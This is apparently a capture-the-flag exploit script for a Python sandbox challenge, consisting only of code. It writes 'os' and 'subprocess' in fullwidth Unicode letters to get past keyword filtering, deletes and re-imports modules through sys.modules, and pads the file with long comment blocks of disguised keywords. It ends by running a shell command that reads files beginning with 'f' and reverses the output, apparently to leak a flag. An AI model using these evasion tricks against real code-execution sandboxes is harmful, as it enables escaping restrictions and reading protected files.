import ｓubprocess
import ｏｓ
from ｓｙｓ import modules as q

try:
    del q["o" + "s"]
    del q["sub" + "pro" + "cess"]
except:
    pass
import ｏｓ
import ｓubprocess

print("a" * 700)
# importIib
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂｉｍｐｏｒｔｌｉｂ
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
# ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()ｔｒｕｎｃａｔｅ()
print(ｓubprocess.check_ｏutput(["sh", "-c", "ca" + "t f*|rev"]))

# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
